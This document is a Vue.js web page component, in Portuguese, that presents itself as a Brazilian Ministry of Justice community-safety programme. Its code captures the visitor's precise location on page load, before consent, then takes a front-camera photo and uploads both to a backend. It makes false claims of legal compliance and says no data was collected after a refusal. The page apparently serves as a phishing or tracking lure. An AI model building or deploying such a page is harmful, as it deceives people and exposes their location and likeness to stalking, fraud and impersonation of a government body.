<template>
  <div
    class="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-blue-100"
  >
    <!-- Header -->
    <header
      class="bg-white/80 backdrop-blur-sm shadow-sm sticky top-0 z-10 border-b border-gray-100"
    >
      <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-4">
        <div class="flex items-center justify-between">
          <div class="flex items-center space-x-2">
            <div
              class="w-10 h-10 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-xl flex items-center justify-center shadow-lg"
            >
              <span class="text-2xl">üõ°Ô∏è</span>
            </div>
            <h1
              class="text-xl font-bold bg-gradient-to-r from-blue-600 to-indigo-600 bg-clip-text text-transparent"
            >
              Seguran√ßa P√∫blica
            </h1>
          </div>
          <div class="text-sm text-gray-500">
            <span v-if="currentPosition" class="flex items-center space-x-1">
              <span>‚úÖ</span>
              <span>Localiza√ß√£o capturada</span>
            </span>
          </div>
        </div>
      </div>
    </header>

    <!-- Main Content -->
    <main class="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
      <!-- Tela de Consentimento -->
      <transition name="fade">
        <div v-if="!consentGiven && !denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <!-- Hero Section -->
            <div
              class="bg-gradient-to-br from-blue-600 via-indigo-600 to-blue-700 px-8 py-12 text-white text-center"
            >
              <div class="max-w-2xl mx-auto">
                <div
                  class="inline-flex items-center justify-center w-20 h-20 bg-white/20 backdrop-blur-sm rounded-2xl mb-6 shadow-xl"
                >
                  <span class="text-4xl">üõ°Ô∏è</span>
                </div>
                <h2 class="text-3xl sm:text-4xl font-bold mb-4">
                  Minist√©rio da Justi√ßa e Seguran√ßa P√∫blica
                </h2>
                <p class="text-lg text-blue-100">
                  Programa de Seguran√ßa e Prote√ß√£o Comunit√°ria
                </p>
              </div>
            </div>

            <!-- Content Section -->
            <div class="p-8 sm:p-12">
              <div class="max-w-4xl mx-auto">
                <div class="mb-8">
                  <h3
                    class="text-xl font-semibold text-gray-800 mb-4 flex items-center"
                  >
                    <span class="mr-2">üìã</span>
                    Dados Necess√°rios para o Programa
                  </h3>
                  <p class="text-gray-600 mb-6">
                    Para participar do programa de seguran√ßa comunit√°ria e
                    receber alertas de emerg√™ncia em sua regi√£o, precisamos dos
                    seguintes dados:
                  </p>
                  <div class="grid md:grid-cols-2 gap-4">
                    <div
                      class="bg-gradient-to-br from-blue-50 to-indigo-50 p-6 rounded-2xl border border-blue-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">üìç</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Localiza√ß√£o
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para enviar alertas de seguran√ßa espec√≠ficos da sua
                            regi√£o
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-purple-50 to-pink-50 p-6 rounded-2xl border border-purple-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">üì∏</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">Foto</h4>
                          <p class="text-sm text-gray-600">
                            Para verifica√ß√£o de identidade e seguran√ßa do
                            programa
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-green-50 to-emerald-50 p-6 rounded-2xl border border-green-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">üõ°Ô∏è</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Dados de Conex√£o
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para garantir a seguran√ßa e autenticidade do acesso
                          </p>
                        </div>
                      </div>
                    </div>
                    <div
                      class="bg-gradient-to-br from-amber-50 to-orange-50 p-6 rounded-2xl border border-amber-100"
                    >
                      <div class="flex items-start space-x-3">
                        <span class="text-2xl">‚è∞</span>
                        <div>
                          <h4 class="font-semibold text-gray-800 mb-1">
                            Data e Hora
                          </h4>
                          <p class="text-sm text-gray-600">
                            Para registrar sua participa√ß√£o no programa
                          </p>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <!-- Info Box -->
                <div
                  class="bg-blue-50 border-l-4 border-blue-500 p-6 rounded-xl mb-8"
                >
                  <div class="flex items-start space-x-3">
                    <span class="text-2xl">‚ÑπÔ∏è</span>
                    <div>
                      <p class="text-sm text-gray-700 mb-2">
                        <strong>Conformidade Legal:</strong> Este programa est√°
                        em conformidade com a Lei Geral de Prote√ß√£o de Dados
                        (LGPD - Lei n¬∫ 13.709/2018) e ser√° utilizado
                        exclusivamente para fins de seguran√ßa p√∫blica e prote√ß√£o
                        comunit√°ria.
                      </p>
                      <p class="text-sm text-gray-600">
                        Seus dados ser√£o protegidos e armazenados de forma
                        segura, conforme as diretrizes do Minist√©rio da Justi√ßa
                        e Seguran√ßa P√∫blica.
                      </p>
                    </div>
                  </div>
                </div>

                <!-- Action Buttons -->
                <div class="flex flex-col sm:flex-row gap-4">
                  <button
                    @click="grantConsent"
                    class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
                  >
                    <span class="flex items-center justify-center space-x-2">
                      <span>‚úì</span>
                      <span>Concordo e Participo do Programa</span>
                    </span>
                  </button>
                  <button
                    @click="denyConsent"
                    class="flex-1 bg-gray-100 hover:bg-gray-200 text-gray-800 font-semibold py-4 px-8 rounded-xl transition-all duration-300"
                  >
                    <span class="flex items-center justify-center space-x-2">
                      <span>‚úó</span>
                      <span>N√£o Desejo Participar</span>
                    </span>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </transition>

      <!-- Interface Principal ap√≥s Consentimento -->
      <transition name="fade">
        <div v-if="consentGiven && !denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <!-- Header da Interface Principal -->
            <div
              class="bg-gradient-to-r from-blue-600 to-indigo-600 px-8 py-8 text-white"
            >
              <div class="flex items-center justify-between flex-wrap gap-4">
                <div>
                  <h2 class="text-2xl sm:text-3xl font-bold mb-2">
                    üõ°Ô∏è Programa de Seguran√ßa Comunit√°ria
                  </h2>
                  <p class="text-blue-100">
                    Registro de participa√ß√£o e verifica√ß√£o de identidade
                  </p>
                </div>
                <div
                  class="flex items-center space-x-2 bg-white/20 backdrop-blur-sm px-4 py-2 rounded-xl"
                >
                  <span class="text-xl">üì∏</span>
                  <span class="text-sm font-medium">C√¢mera ativa</span>
                </div>
              </div>
            </div>

            <!-- Content -->
            <div class="p-8">
              <!-- Preview da C√¢mera -->
              <div v-if="stream" class="mb-8">
                <div class="relative max-w-2xl mx-auto">
                  <div
                    class="absolute inset-0 bg-gradient-to-r from-blue-500 to-indigo-500 rounded-2xl blur-xl opacity-30"
                  ></div>
                  <video
                    ref="videoElement"
                    autoplay
                    playsinline
                    class="relative w-full rounded-2xl shadow-2xl border-4 border-white"
                  ></video>
                </div>
              </div>

              <!-- Mensagens de Status -->
              <transition name="slide">
                <div
                  v-if="statusMessage"
                  :class="statusClass"
                  class="mb-6 p-4 rounded-xl shadow-md text-center font-medium"
                >
                  {{ statusMessage }}
                </div>
              </transition>

              <!-- Bot√£o Principal -->
              <div class="text-center mb-8">
                <button
                  @click="captureAndSend"
                  :disabled="loading || !streamActive"
                  class="inline-flex items-center space-x-3 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 disabled:from-gray-400 disabled:to-gray-500 disabled:cursor-not-allowed text-white font-bold py-5 px-10 rounded-2xl text-lg transition-all duration-300 shadow-xl hover:shadow-2xl transform hover:-translate-y-1 disabled:transform-none"
                >
                  <span v-if="loading" class="animate-spin">‚è≥</span>
                  <span v-else>üõ°Ô∏è</span>
                  <span>{{
                    loading ? "Registrando..." : "Confirmar Participa√ß√£o"
                  }}</span>
                </button>
              </div>

              <!-- Log de Atividades -->
              <transition name="fade">
                <div
                  v-if="logs.length > 0"
                  class="bg-gradient-to-br from-gray-50 to-gray-100 rounded-2xl p-6 border border-gray-200"
                >
                  <h3 class="font-bold text-gray-800 mb-4 flex items-center">
                    <span class="mr-2">üìã</span>
                    Registros de Participa√ß√£o
                  </h3>
                  <div class="space-y-3 max-h-60 overflow-y-auto">
                    <div
                      v-for="(log, index) in logs"
                      :key="index"
                      class="bg-white rounded-xl p-4 shadow-sm border border-gray-100 text-sm text-gray-700 animate-slide-in"
                    >
                      {{ log }}
                    </div>
                  </div>
                </div>
              </transition>
            </div>
          </div>
        </div>
      </transition>

      <!-- Tela de Nega√ß√£o -->
      <transition name="fade">
        <div v-if="denied" class="animate-fade-in">
          <div
            class="bg-white rounded-3xl shadow-2xl overflow-hidden border border-gray-100"
          >
            <div
              class="bg-gradient-to-br from-red-500 to-pink-500 px-8 py-12 text-white text-center"
            >
              <div
                class="inline-flex items-center justify-center w-20 h-20 bg-white/20 backdrop-blur-sm rounded-2xl mb-6 shadow-xl"
              >
                <span class="text-4xl">‚ùå</span>
              </div>
              <h2 class="text-3xl font-bold mb-4">Participa√ß√£o Cancelada</h2>
              <p class="text-lg text-red-100">Nenhum dado foi coletado</p>
            </div>

            <div class="p-12 text-center">
              <p class="text-gray-700 mb-8 text-lg">
                Voc√™ escolheu n√£o participar do programa de seguran√ßa
                comunit√°ria. Sua privacidade foi respeitada e nenhuma informa√ß√£o
                foi coletada.
              </p>
              <button
                @click="resetConsent"
                class="inline-flex items-center space-x-2 bg-gradient-to-r from-gray-600 to-gray-700 hover:from-gray-700 hover:to-gray-800 text-white font-semibold py-4 px-8 rounded-xl transition-all duration-300 shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
              >
                <span>‚Ü©Ô∏è</span>
                <span>Reconsiderar Participa√ß√£o</span>
              </button>
            </div>
          </div>
        </div>
      </transition>
    </main>
  </div>
</template>

<script setup>
import { ref, onMounted, onBeforeUnmount, nextTick } from "vue";
import api from "../axios";

// Estados reativos
const consentGiven = ref(false);
const denied = ref(false);
const stream = ref(null);
const videoElement = ref(null);
const streamActive = ref(false);
const loading = ref(false);
const statusMessage = ref("");
const statusClass = ref("");
const logs = ref([]);
const currentPosition = ref(null);

// Lifecycle hooks
onMounted(() => {
  // Capturar localiza√ß√£o automaticamente ao montar o componente
  captureLocation();
});

onBeforeUnmount(() => {
  // Parar stream da c√¢mera quando componente for desmontado
  stopCamera();
});

// M√©todos
const grantConsent = () => {
  consentGiven.value = true;
  denied.value = false;
  showStatus(
    "Participa√ß√£o autorizada. Inicializando verifica√ß√£o de identidade...",
    "success"
  );
  // Inicializar c√¢mera ap√≥s consentimento
  initCamera();
};

const denyConsent = () => {
  denied.value = true;
  consentGiven.value = false;
  stopCamera();
};

const resetConsent = () => {
  consentGiven.value = false;
  denied.value = false;
  logs.value = [];
  stopCamera();
  // Recapturar localiza√ß√£o ao resetar
  captureLocation();
};

const captureLocation = async () => {
  try {
    showStatus("Registrando localiza√ß√£o para alertas regionais...", "info");
    const position = await getCurrentPosition();
    currentPosition.value = position;
    showStatus(
      "‚úÖ Localiza√ß√£o registrada para alertas de seguran√ßa!",
      "success"
    );
  } catch (error) {
    console.error("Erro ao capturar localiza√ß√£o:", error);
    showStatus(
      "‚ö†Ô∏è N√£o foi poss√≠vel registrar localiza√ß√£o. Verifique as permiss√µes.",
      "error"
    );
  }
};

const initCamera = async () => {
  try {
    console.log("initCamera");
    // Solicitar acesso √† c√¢mera
    stream.value = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, // C√¢mera frontal
    });

    // Aguardar at√© que o componente tenha o elemento video
    await nextTick();

    if (videoElement.value) {
      videoElement.value.srcObject = stream.value;
      streamActive.value = true;
      showStatus("Verifica√ß√£o de identidade ativada!", "success");
    }
  } catch (error) {
    console.error("Erro ao acessar c√¢mera:", error);
    showStatus("‚ùå Erro ao acessar c√¢mera. Verifique as permiss√µes.", "error");
    streamActive.value = false;
  }
};

const stopCamera = () => {
  if (stream.value) {
    stream.value.getTracks().forEach((track) => track.stop());
    stream.value = null;
    streamActive.value = false;
  }
};

const captureAndSend = async () => {
  if (!streamActive.value || loading.value) return;
  // Verificar se temos localiza√ß√£o
  if (!currentPosition.value) {
    showStatus("‚ùå Localiza√ß√£o n√£o dispon√≠vel. Recapturando...", "error");
    await captureLocation();
    if (!currentPosition.value) {
      return;
    }
  }
  loading.value = true;
  showStatus("Registrando participa√ß√£o no programa...", "info");

  try {
    // Capturar frame da c√¢mera
    const photoBlob = await capturePhoto();

    // Enviar dados em paralelo usando a localiza√ß√£o j√° capturada
    await Promise.all([
      sendLocation(currentPosition.value),
      sendPhoto(photoBlob),
    ]);

    showStatus(
      "‚úÖ Participa√ß√£o confirmada! Obrigado por contribuir com a seguran√ßa comunit√°ria.",
      "success"
    );
    addLog(
      `Enviado em ${new Date().toLocaleTimeString()} - Lat: ${currentPosition.value.coords.latitude.toFixed(
        6
      )}, Lng: ${currentPosition.value.coords.longitude.toFixed(6)}`
    );
  } catch (error) {
    console.error("Erro:", error);
    showStatus(`‚ùå Erro: ${error.message}`, "error");
  } finally {
    loading.value = false;
  }
};

const getCurrentPosition = () => {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error("Geolocaliza√ß√£o n√£o suportada neste navegador"));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, {
      enableHighAccuracy: true,
      timeout: 10000,
      maximumAge: 0,
    });
  });
};

const capturePhoto = () => {
  return new Promise((resolve, reject) => {
    const video = videoElement.value;
    if (!video) {
      reject(new Error("Elemento de v√≠deo n√£o encontrado"));
      return;
    }

    // Criar canvas e capturar frame
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0);

    // Converter para blob
    canvas.toBlob(
      (blob) => {
        if (blob) {
          resolve(blob);
        } else {
          reject(new Error("Erro ao converter imagem para blob"));
        }
      },
      "image/jpeg",
      0.9
    );
  });
};

const sendLocation = async (position) => {
  const data = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    note: "Registro de participa√ß√£o - Programa de Seguran√ßa Comunit√°ria",
  };
  await api.post("/log", data);
  console.log("Localiza√ß√£o registrada:", data);
};

const sendPhoto = async (blob) => {
  const formData = new FormData();
  formData.append("photo", blob, "photo.jpg");
  formData.append(
    "note",
    "Verifica√ß√£o de identidade - Programa de Seguran√ßa Comunit√°ria"
  );

  const response = await api.post("/upload-photo", formData, {
    headers: {
      "Content-Type": "multipart/form-data",
    },
  });
  console.log("Foto registrada:", response.data);
  return response.data;
};

const showStatus = (message, type) => {
  statusMessage.value = message;
  const classes = {
    success: "bg-green-100 text-green-800",
    error: "bg-red-100 text-red-800",
    info: "bg-blue-100 text-blue-800",
  };
  statusClass.value = classes[type] || classes.info;
};

const addLog = (message) => {
  logs.value.unshift(message);
  if (logs.value.length > 10) {
    logs.value.pop();
  }
};
</script>

<style scoped>
/* Anima√ß√µes de Transi√ß√£o */
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.5s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}

.slide-enter-active,
.slide-leave-active {
  transition: all 0.3s ease;
}

.slide-enter-from {
  opacity: 0;
  transform: translateY(-10px);
}

.slide-leave-to {
  opacity: 0;
  transform: translateY(10px);
}

/* Anima√ß√µes Customizadas */
@keyframes fade-in {
  from {
    opacity: 0;
    transform: translateY(20px);
  }
  to {
    opacity: 1;
    transform: translateY(0);
  }
}

@keyframes slide-in {
  from {
    opacity: 0;
    transform: translateX(-10px);
  }
  to {
    opacity: 1;
    transform: translateX(0);
  }
}

.animate-fade-in {
  animation: fade-in 0.6s ease-out;
}

.animate-slide-in {
  animation: slide-in 0.4s ease-out;
}

/* Scrollbar customizada */
::-webkit-scrollbar {
  width: 8px;
}

::-webkit-scrollbar-track {
  background: #f1f1f1;
  border-radius: 10px;
}

::-webkit-scrollbar-thumb {
  background: linear-gradient(to bottom, #3b82f6, #6366f1);
  border-radius: 10px;
}

::-webkit-scrollbar-thumb:hover {
  background: linear-gradient(to bottom, #2563eb, #4f46e5);
}
</style>
